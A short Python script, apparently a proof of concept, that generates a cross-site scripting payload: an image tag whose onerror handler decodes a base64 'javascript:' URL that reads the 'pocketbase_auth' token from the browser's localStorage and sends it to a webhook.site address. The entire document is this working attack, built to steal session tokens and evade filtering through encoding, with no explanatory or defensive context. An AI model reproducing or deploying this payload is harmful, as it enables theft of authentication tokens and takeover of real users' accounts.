import base64

payload = 'javascript:fetch(`https://webhook.site/94c40387-429e-4852-8a60-4b38eb005e7a/${localStorage.getItem("pocketbase_auth")}`)'

print(f'&lt;img src=1 onerror=location=atob`{base64.b64encode(bytes(f"javascript:{payload}", "utf-8"))}`&gt;')